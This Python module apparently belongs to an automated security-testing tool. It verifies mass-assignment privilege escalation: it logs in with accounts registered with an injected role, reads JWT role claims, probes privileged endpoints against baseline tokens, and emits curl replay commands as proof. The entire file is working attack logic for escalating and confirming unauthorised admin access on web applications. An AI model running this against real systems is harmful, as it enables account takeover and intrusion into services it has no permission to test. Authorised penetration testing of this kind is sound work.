"""Internal helpers for crown-proof and relogin verification."""

from __future__ import annotations

import base64
import json
import shlex
from typing import Any

from ._api_security_self_write import _load_json
from ._api_security_self_write import _normalize_path
from .attempt_auth import LOGIN_PATHS as AUTH_LOGIN_PATHS
from .attempt_auth import _discover_asset_auth_paths
from .attempt_auth import _extract_token_and_user_info


def _decode_jwt_claims(token: str) -> dict[str, Any]:
    parts = str(token or "").split(".")
    if len(parts) < 2:
        return {}
    payload = parts[1].strip()
    if not payload:
        return {}
    try:
        decoded = base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4))
    except Exception:
        return {}
    parsed = _load_json(decoded.decode("utf-8", "ignore"))
    return parsed if isinstance(parsed, dict) else {}


def _claim_value(claims: dict[str, Any], *paths: tuple[str, ...]) -> Any:
    for path in paths:
        current: Any = claims
        for part in path:
            if not isinstance(current, dict):
                current = None
                break
            current = current.get(part)
        if current not in (None, ""):
            return current
    return None


def _curl_request_command(
    method: str,
    url: str,
    *,
    headers: dict[str, str] | None = None,
    json_body: dict[str, Any] | None = None,
) -> str:
    parts = ["curl", "-sS", "-i", "-X", method.upper()]
    for key, value in (headers or {}).items():
        parts.extend(["-H", f"{key}: {value}"])
    if json_body is not None:
        parts.extend(
            [
                "-H",
                "Content-Type: application/json",
                "--data",
                json.dumps(json_body, separators=(",", ":"), sort_keys=True),
            ]
        )
    parts.append(url)
    return " ".join(shlex.quote(part) for part in parts)


def _probe_request_spec(candidate: Any) -> dict[str, Any]:
    if isinstance(candidate, str):
        return {
            "kind": "http",
            "path": _normalize_path(candidate).split("?", 1)[0],
            "method": "GET",
        }
    if not isinstance(candidate, dict):
        return {}
    path = str(candidate.get("path") or candidate.get("endpoint") or "").strip()
    if not path:
        return {}
    return {
        "kind": str(candidate.get("kind") or "http"),
        "path": _normalize_path(path).split("?", 1)[0],
        "method": str(candidate.get("method") or "GET").upper(),
        "json_body": candidate.get("json_body"),
        "headers": dict(candidate.get("headers") or {}),
        "inject_token_body": bool(candidate.get("inject_token_body")),
    }


def _probe_request_body(candidate: dict[str, Any], token: str | None = None) -> dict[str, Any] | None:
    body = candidate.get("json_body")
    if not isinstance(body, dict):
        return None
    cloned = dict(body)
    if candidate.get("inject_token_body"):
        if token:
            cloned["token"] = token
        else:
            cloned.pop("token", None)
    return cloned


async def _execute_probe_request(
    session: Any,
    *,
    target: str,
    candidate: dict[str, Any],
    token: str | None,
) -> Any:
    headers = dict(candidate.get("headers") or {})
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = _probe_request_body(candidate, token)
    if body is not None:
        headers.setdefault("Content-Type", "application/json")
        headers.setdefault("Accept", "application/json")
    return await session.request(
        str(candidate.get("method") or "GET"),
        f"{target}{candidate['path']}",
        headers=headers or None,
        json_data=body,
    )


async def _probe_privileged_access(
    session: Any,
    *,
    target: str,
    elevated_token: str,
    baseline_token: str | None,
    candidate_paths: list[Any],
) -> dict[str, Any]:
    if not elevated_token:
        return {}
    has_baseline = bool(baseline_token and baseline_token != elevated_token)
    for raw_candidate in candidate_paths:
        candidate = _probe_request_spec(raw_candidate)
        if not candidate:
            continue
        try:
            noauth = await _execute_probe_request(
                session,
                target=target,
                candidate=candidate,
                token=None,
            )
            baseline = (
                await _execute_probe_request(
                    session,
                    target=target,
                    candidate=candidate,
                    token=baseline_token,
                )
                if has_baseline
                else None
            )
            elevated = await _execute_probe_request(
                session,
                target=target,
                candidate=candidate,
                token=elevated_token,
            )
        except Exception:
            continue
        if elevated.status not in (200, 201, 204):
            continue
        noauth_status = int(getattr(noauth, "status", 0) or 0)
        baseline_status = int(getattr(baseline, "status", 0) or 0) if baseline else 0
        if has_baseline:
            if baseline_status not in (401, 403):
                continue
        elif noauth_status not in (401, 403):
            continue
        return {
            "endpoint": candidate["path"],
            "method": str(candidate.get("method") or "GET"),
            "request_kind": str(candidate.get("kind") or "http"),
            "json_body": _probe_request_body(candidate),
            "inject_token_body": bool(candidate.get("inject_token_body")),
            "noauth_status": noauth_status,
            "baseline_status": baseline_status,
            "elevated_status": elevated.status,
            "noauth_preview": (getattr(noauth, "text", "") or "")[:180],
            "baseline_preview": (getattr(baseline, "text", "") or "")[:180] if baseline else "",
            "elevated_preview": (getattr(elevated, "text", "") or "")[:180],
        }
    return {}


def _baseline_token_from_identities(foothold_token: str | None, identities: Any) -> str | None:
    for item in list(identities or []):
        if not isinstance(item, dict):
            continue
        token = str(item.get("token") or item.get("bearer") or "").strip()
        if token and token != str(foothold_token or "").strip():
            return token
    return None


async def _login_mass_assignment_account(
    session: Any,
    *,
    target: str,
    email: str,
    username: str,
    password: str,
    expected_role: str | None = None,
    login_paths: list[str] | None = None,
) -> dict[str, Any]:
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    attempts = [
        ("email", {"email": email, "password": password}),
        ("username", {"username": username, "password": password}),
    ]
    login_paths = [
        _normalize_path(str(path or "")).split("?", 1)[0]
        for path in [*(login_paths or []), *AUTH_LOGIN_PATHS]
        if str(path or "").strip()
    ]
    login_paths = list(dict.fromkeys(login_paths))
    try:
        for path in await _discover_asset_auth_paths(session):
            lower = path.lower()
            if any(marker in lower for marker in ("login", "sign-in", "sign_in", "signin")) and path not in login_paths:
                login_paths.append(path)
    except Exception:
        pass
    for path in login_paths:
        for identity, payload in attempts:
            try:
                response = await session.request(
                    "POST",
                    f"{target}{path}",
                    json_data=payload,
                    headers=headers,
                )
            except Exception:
                continue
            if response.status not in (200, 201):
                continue
            parsed = _load_json(response.text)
            user_info: dict[str, Any] = {}
            raw_token = ""
            if isinstance(parsed, dict):
                token, user_info = _extract_token_and_user_info(parsed)
                raw_token = token
                user = parsed.get("user")
                if isinstance(user, dict):
                    for key in ("email", "role", "id"):
                        if not user_info.get(key) and user.get(key) not in (None, ""):
                            user_info[key] = user.get(key)
                auth = parsed.get("authentication", parsed)
                if isinstance(auth, dict):
                    token_value = auth.get("token")
                    if isinstance(token_value, str) and token_value.strip():
                        raw_token = raw_token or token_value.strip()
                if not raw_token:
                    token_value = parsed.get("token")
                    if isinstance(token_value, str) and token_value.strip():
                        raw_token = token_value.strip()
                if not raw_token:
                    data = parsed.get("data")
                    if isinstance(data, dict):
                        token_value = data.get("token")
                        if isinstance(token_value, str) and token_value.strip():
                            raw_token = token_value.strip()
            jwt_claims = _decode_jwt_claims(raw_token)
            effective_role = str(
                user_info.get("role")
                or _claim_value(jwt_claims, ("role",), ("data", "role"))
                or ""
            ).strip()
            if expected_role and effective_role and effective_role.lower() != expected_role.lower():
                continue
            if effective_role and not user_info.get("role"):
                user_info["role"] = effective_role
            if not user_info.get("email"):
                claim_email = _claim_value(jwt_claims, ("email",), ("data", "email"))
                if claim_email not in (None, ""):
                    user_info["email"] = claim_email
            if not user_info.get("id"):
                claim_id = _claim_value(jwt_claims, ("id",), ("bid",), ("data", "id"))
                if claim_id not in (None, ""):
                    user_info["id"] = claim_id
            response_headers = {
                str(key).lower(): str(value)
                for key, value in dict(getattr(response, "headers", {}) or {}).items()
            }
            return {
                "login_endpoint": path,
                "identity": identity,
                "status": response.status,
                "token_observed": bool(raw_token),
                "session_cookie_observed": bool(response_headers.get("set-cookie")),
                "effective_role": effective_role,
                "user_info": user_info,
                "jwt_claims": jwt_claims,
                "response_preview": response.text[:300],
                "token": raw_token,
            }
    return {}


async def _verify_mass_assignment_login(
    session: Any,
    *,
    target: str,
    registration_path: str,
    email: str,
    username: str,
    password: str,
    persisted_role: str,
    foothold_token: str | None = None,
    baseline_account: dict[str, str] | None = None,
    candidate_paths: list[Any] | None = None,
    login_paths: list[str] | None = None,
) -> dict[str, Any]:
    login = await _login_mass_assignment_account(
        session,
        target=target,
        email=email,
        username=username,
        password=password,
        expected_role=persisted_role,
        login_paths=login_paths,
    )
    if not login:
        return {}

    baseline_login: dict[str, Any] = {}
    baseline_token = foothold_token
    if baseline_account:
        baseline_login = await _login_mass_assignment_account(
            session,
            target=target,
            email=str(baseline_account.get("email") or ""),
            username=str(baseline_account.get("username") or ""),
            password=str(baseline_account.get("password") or ""),
            login_paths=login_paths,
        )
        if baseline_login.get("token"):
            baseline_token = str(baseline_login["token"])

    evidence = {
        "login_endpoint": login["login_endpoint"],
        "identity": login["identity"],
        "status": login["status"],
        "token_observed": login["token_observed"],
        "session_cookie_observed": login["session_cookie_observed"],
        "persisted_role": persisted_role,
        "effective_role": login["effective_role"],
        "principal": {
            "email": email,
            "username": username,
            "password": password,
        },
        "user_info": login["user_info"],
        "jwt_claims": login["jwt_claims"],
        "response_preview": login["response_preview"],
    }
    if baseline_account and baseline_login:
        evidence["baseline_login_endpoint"] = baseline_login["login_endpoint"]
        evidence["baseline_identity"] = baseline_login["identity"]
        evidence["baseline_principal"] = {
            "email": str(baseline_account.get("email") or ""),
            "username": str(baseline_account.get("username") or ""),
            "password": str(baseline_account.get("password") or ""),
        }
        evidence["baseline_effective_role"] = baseline_login.get("effective_role") or ""
        evidence["baseline_user_info"] = baseline_login.get("user_info") or {}
        evidence["baseline_jwt_claims"] = baseline_login.get("jwt_claims") or {}
    evidence["replay_commands"] = {
        "register": _curl_request_command(
            "POST",
            f"{target}{registration_path}",
            json_body={
                "email": email,
                "password": password,
                "role": persisted_role,
                "username": username,
            },
        ),
        "relogin": _curl_request_command(
            "POST",
            f"{target}{login['login_endpoint']}",
            json_body={
                login["identity"]: email if login["identity"] == "email" else username,
                "password": password,
            },
        ),
    }
    if baseline_account and baseline_login:
        evidence["replay_commands"]["baseline_register"] = _curl_request_command(
            "POST",
            f"{target}{registration_path}",
            json_body=evidence["baseline_principal"],
        )
        evidence["replay_commands"]["baseline_relogin"] = _curl_request_command(
            "POST",
            f"{target}{baseline_login['login_endpoint']}",
            json_body={
                baseline_login["identity"]: evidence["baseline_principal"]["email"]
                if baseline_login["identity"] == "email"
                else evidence["baseline_principal"]["username"],
                "password": evidence["baseline_principal"]["password"],
            },
        )
    privileged_access_proof = await _probe_privileged_access(
        session,
        target=target,
        elevated_token=str(login.get("token") or ""),
        baseline_token=baseline_token,
        candidate_paths=list(candidate_paths or []),
    )
    if privileged_access_proof:
        probe_method = str(privileged_access_proof.get("method") or "GET")
        probe_body = (
            dict(privileged_access_proof.get("json_body") or {})
            if isinstance(privileged_access_proof.get("json_body"), dict)
            else None
        )
        inject_token_body = bool(privileged_access_proof.get("inject_token_body"))

        def replay_probe_body(token_placeholder: str | None = None) -> dict[str, Any] | None:
            if probe_body is None:
                return None
            body = dict(probe_body)
            if inject_token_body:
                if token_placeholder:
                    body["token"] = token_placeholder
                else:
                    body.pop("token", None)
            return body

        evidence["privileged_access_proof"] = privileged_access_proof
        evidence["replay_commands"]["control_probe"] = _curl_request_command(
            probe_method,
            f"{target}{privileged_access_proof['endpoint']}",
            json_body=replay_probe_body(),
        )
        if baseline_account and baseline_login.get("token"):
            evidence["replay_commands"]["baseline_probe"] = _curl_request_command(
                probe_method,
                f"{target}{privileged_access_proof['endpoint']}",
                headers={"Authorization": "Bearer <baseline_token>"},
                json_body=replay_probe_body("<baseline_token>"),
            )
        if foothold_token and foothold_token != baseline_login.get("token"):
            evidence["replay_commands"]["foothold_probe"] = _curl_request_command(
                probe_method,
                f"{target}{privileged_access_proof['endpoint']}",
                headers={"Authorization": "Bearer <foothold_token>"},
                json_body=replay_probe_body("<foothold_token>"),
            )
        evidence["replay_commands"]["privileged_probe"] = _curl_request_command(
            probe_method,
            f"{target}{privileged_access_proof['endpoint']}",
            headers={"Authorization": "Bearer <minted_token>"},
            json_body=replay_probe_body("<minted_token>"),
        )
    return evidence


async def _verify_self_write_mass_assignment(
    session: Any,
    *,
    target: str,
    candidate: dict[str, Any],
    request_body: dict[str, Any],
    response: Any,
    field_info: dict[str, Any],
    foothold_token: str | None,
    baseline_token: str | None,
    candidate_paths: list[Any] | None = None,
    seed_values: dict[str, str] | None = None,
    login_paths: list[str] | None = None,
) -> dict[str, Any]:
    def _first_body_value(*keys: str) -> str:
        for key in keys:
            text = str(request_body.get(key) or "").strip()
            if text:
                return text
        return ""

    parsed = _load_json(getattr(response, "text", ""))
    response_token = ""
    user_info: dict[str, Any] = {}
    if isinstance(parsed, dict):
        response_token, user_info = _extract_token_and_user_info(parsed)
        user = parsed.get("user")
        if isinstance(user, dict):
            for key in ("email", "role", "id"):
                if not user_info.get(key) and user.get(key) not in (None, ""):
                    user_info[key] = user.get(key)
    jwt_claims = _decode_jwt_claims(response_token)
    effective_role = str(
        user_info.get("role")
        or _claim_value(jwt_claims, ("role",), ("data", "role"))
        or ""
    ).strip()
    elevated_token = response_token or str(foothold_token or "")
    privileged_access_proof = await _probe_privileged_access(
        session,
        target=target,
        elevated_token=elevated_token,
        baseline_token=baseline_token,
        candidate_paths=list(candidate_paths or []),
    )
    relogin: dict[str, Any] = {}
    if not privileged_access_proof:
        relogin_email = str(
            _first_body_value("new_email", "newEmail", "email")
            or user_info.get("email")
            or dict(seed_values or {}).get("email")
            or ""
        ).strip()
        relogin_username = str(
            _first_body_value("new_username", "newUsername", "username")
            or user_info.get("username")
            or dict(seed_values or {}).get("username")
            or dict(seed_values or {}).get("name")
            or ""
        ).strip()
        relogin_password = _first_body_value(
            "new_password",
            "newPassword",
            "password",
            "passwd",
            "pwd",
            "repeat_password",
            "repeatPassword",
            "confirm_password",
            "confirmPassword",
            "password_confirmation",
            "passwordConfirmation",
            "current_password",
            "currentPassword",
            "old_password",
            "oldPassword",
        )
        expected_role = effective_role or str(field_info.get("value") or "").strip()
        if relogin_password and (relogin_email or relogin_username):
            relogin = await _login_mass_assignment_account(
                session,
                target=target,
                email=relogin_email,
                username=relogin_username,
                password=relogin_password,
                expected_role=expected_role or None,
                login_paths=login_paths,
            )
            relogin_token = str(relogin.get("token") or "")
            if relogin_token:
                privileged_access_proof = await _probe_privileged_access(
                    session,
                    target=target,
                    elevated_token=relogin_token,
                    baseline_token=baseline_token,
                    candidate_paths=list(candidate_paths or []),
                )
    if not privileged_access_proof:
        return {}
    response_headers = {
        str(key).lower(): str(value)
        for key, value in dict(getattr(response, "headers", {}) or {}).items()
    }
    probe_method = str(privileged_access_proof.get("method") or "GET")
    probe_body = (
        dict(privileged_access_proof.get("json_body") or {})
        if isinstance(privileged_access_proof.get("json_body"), dict)
        else None
    )
    inject_token_body = bool(privileged_access_proof.get("inject_token_body"))

    def replay_probe_body(token_placeholder: str | None = None) -> dict[str, Any] | None:
        if probe_body is None:
            return None
        body = dict(probe_body)
        if inject_token_body:
            if token_placeholder:
                body["token"] = token_placeholder
            else:
                body.pop("token", None)
        return body

    evidence = {
        "mutation_endpoint": candidate["path"],
        "mutation_method": str(candidate.get("method") or "POST"),
        "token_observed": bool(response_token or relogin.get("token")),
        "session_cookie_observed": bool(
            response_headers.get("set-cookie") or relogin.get("session_cookie_observed")
        ),
        "persisted_role": relogin.get("effective_role") or effective_role or str(field_info.get("value") or ""),
        "effective_role": relogin.get("effective_role") or effective_role,
        "user_info": relogin.get("user_info") or user_info,
        "jwt_claims": relogin.get("jwt_claims") or jwt_claims,
        "response_preview": str(relogin.get("response_preview") or getattr(response, "text", "")[:300]),
        "privileged_access_proof": privileged_access_proof,
        "replay_commands": {
            "self_write": _curl_request_command(
                str(candidate.get("method") or "POST"),
                f"{target}{candidate['path']}",
                headers={"Authorization": "Bearer <foothold_token>"},
                json_body=request_body,
            ),
            "control_probe": _curl_request_command(
                probe_method,
                f"{target}{privileged_access_proof['endpoint']}",
                json_body=replay_probe_body(),
            ),
            "privileged_probe": _curl_request_command(
                probe_method,
                f"{target}{privileged_access_proof['endpoint']}",
                headers={"Authorization": "Bearer <minted_token>"},
                json_body=replay_probe_body("<minted_token>"),
            ),
        },
    }
    if relogin:
        evidence["login_endpoint"] = relogin["login_endpoint"]
        evidence["identity"] = relogin["identity"]
        evidence["status"] = relogin["status"]
        evidence["principal"] = {
            "email": relogin_email,
            "username": relogin_username,
            "password": relogin_password,
        }
        evidence["replay_commands"]["relogin"] = _curl_request_command(
            "POST",
            f"{target}{relogin['login_endpoint']}",
            json_body={
                relogin["identity"]: relogin_email if relogin["identity"] == "email" else relogin_username,
                "password": relogin_password,
            },
        )
    if baseline_token:
        evidence["replay_commands"]["baseline_probe"] = _curl_request_command(
            probe_method,
            f"{target}{privileged_access_proof['endpoint']}",
            headers={"Authorization": "Bearer <baseline_token>"},
            json_body=replay_probe_body("<baseline_token>"),
        )
    return evidence
